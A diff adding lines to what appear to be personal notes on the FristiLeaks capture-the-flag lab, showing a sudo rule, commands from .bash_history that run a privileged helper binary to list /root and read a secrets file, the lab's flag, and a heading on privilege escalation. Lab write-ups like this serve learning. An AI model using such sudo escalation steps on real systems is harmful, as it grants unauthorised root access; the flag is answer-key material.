@@ -138,3 +138,11 @@ su fristigod
 sudo -l
   User fristigod may run the following commands on this host:
     (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
+
+more .bash_history
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /root
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom cat /root/fristileaks_secrets.txt
+Flag: Y0u_kn0w_y0u_l0ve_fr1st1
+
+Elevación privs
+
